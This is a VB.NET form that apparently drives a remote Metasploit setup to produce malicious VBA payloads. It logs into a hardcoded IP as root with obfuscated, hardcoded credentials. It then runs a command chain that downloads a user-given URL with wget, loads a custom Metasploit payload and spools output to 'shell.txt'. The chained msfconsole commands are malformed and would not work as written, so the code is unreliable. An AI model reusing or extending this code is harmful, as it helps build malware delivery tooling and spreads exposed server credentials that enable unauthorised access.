Imports Renci.SshNet
Imports System.IO
Imports Renci.SshNet.Sftp
Imports System.Runtime.InteropServices
Imports Microsoft.Office.Interop
Imports Microsoft.Vbe.Interop
Imports Word = Microsoft.Office.Interop.Word

Imports System.Reflection
Public Class Form17

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        RichTextBox1.Text = "Please wait.."

        Dim dXNlcm As String = "t"
        Dim hbWUo As String = "S!$gM]r!z"
        Dim cGFzc3 As String = "roo"
        Dim dvcmQ As String = "]a*B}%_8.s35"
        Dim cmVqa3dyaHdlaHI As String = cGFzc3 & dXNlcm
        Dim ZHNrbGZqc2RsZmpz As String = hbWUo & dvcmQ

        Dim connInfo As New Renci.SshNet.PasswordConnectionInfo("137.74.21.206", cmVqa3dyaHdlaHI, ZHNrbGZqc2RsZmpz)
        Dim sshClient As New Renci.SshNet.SshClient(connInfo)


        Using sshClient

            sshClient.Connect()

            Dim sc As SshCommand = sshClient.CreateCommand("cd Downloads && " + "wget " & TextBox1.Text + " && " + "msfconsole && " + "use payload/generic/custom && " + "set PAYLOADFILE /root/Downloads/" & TextBox3.Text + " && set PAYLOADSTR mycustomexe && " + "spool /Downloads/shell.txt && ")

            Try
                RichTextBox1.Text = "Generating vba.."
                sc.Execute()

            Catch ex As Exception
                'flag = 1
                RichTextBox1.Text = "Error: #MF02 Try again or contact support"
            End Try

            sshClient.Disconnect()
        End Using

        'If 'flag = 1 Then
        'Else
        'DownloadVBA()
        'removeserverfile()
        'End If
    End Sub
End Class